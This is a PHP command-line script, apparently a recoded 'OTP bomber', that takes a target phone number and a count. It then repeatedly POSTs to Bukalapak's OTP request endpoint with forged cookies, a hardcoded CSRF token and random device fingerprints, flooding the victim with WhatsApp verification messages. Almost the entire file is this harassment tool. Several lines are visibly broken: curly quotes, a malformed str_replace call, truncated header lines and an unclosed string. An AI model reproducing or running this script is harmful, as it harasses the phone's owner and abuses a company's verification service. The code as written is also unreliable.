<?php
echo "COPYRIGHT : SGB TEAM\n\n";
echo “Di recode oleh : RekiXploit”;
echo "Nomor Target?\nInput : ";
$nomer = trim(fgets(STDIN));
if(strlen($nomer)==11){
        $nomer = str_replace("0","62".$nomer);
}elseif(strlen($nomer)>12){
        $nomer = str_replace("62","0",$nomer);
}
echo "Target: $nomer (y/n)";
$cek = trim(fgets(STDIN));
if($cek=="n") exit("Stopped!\n");
echo "Jumlah?\nInput : ";
$jumlah = trim(fgets(STDIN));
for($a=0;$a<$jumlah;$a++) {
        $rand1 = md5(rand(12345678,98765432));
        $rand2 = md5(rand(12345678,98765432));
        $rand = array($rand1,$rand2);
        $rand3 = md5($rand[rand(1,2)]);
        $config['headers'] = explode("\n", "Host: m.bukalapak.com
Connection: keep-alive
Content-Length: 134
Origin: https://m.bukalapak.com
X-CSRF-Token: uYUfi93g92mZboBVB4UMwYInorBNOgyYEAbPUTikHht+xseF8BFUgg9qSgQWA9MRy7eL8G/SnbYUGg0JRM1fjw>
User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X Build/N2G47H) AppleWebKit/537.36 (KHTML, lik>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
X-Requested-With: XMLHttpRequest
Save-Data: on
Referer: https://m.bukalapak.com/register?from=home_mobile
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,id;q=0.8
Cookie: identity=".$rand1."; browser_id=".$rand2."; _ga=GA1.2.1024758930.1531960985; _vwo_uuid_v2=DE>
        global $config;
        $ar = http_build_query(array(
                                'feature' => 'phone_registration',
                                'feature_tag' => '',
                                'manual_phone' => $nomer,
                                'device_fingerprint' => $rand3,
                                'channel' => 'WhatsApp'
                             )
                           );
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://m.bukalapak.com/trusted_devices/otp_request");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
        $asw = curl_exec($ch);
        curl_close($ch);
        print $a.$nomer." [Sending]\n";
}
